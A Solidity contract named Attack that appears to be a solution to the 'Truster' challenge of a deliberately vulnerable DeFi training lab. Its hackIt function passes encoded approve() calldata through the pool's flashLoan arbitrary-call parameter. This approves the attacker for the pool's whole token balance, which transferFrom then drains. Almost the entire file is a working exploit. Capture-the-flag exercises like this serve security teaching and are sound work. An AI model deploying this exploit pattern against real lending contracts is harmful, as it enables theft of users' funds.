// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract Attack {
    TrusterLenderPool public pool;
    IERC20 public token;

    constructor(address _pool, address dvt) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(dvt);
    }

    function hackIt(address mine) public {
        uint256 tokenBalance = token.balanceOf(address(pool));

        bytes memory approval = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            tokenBalance
        );

        pool.flashLoan(0, mine, address(token), approval);
        token.transferFrom(address(pool), mine, tokenBalance);
    }
}
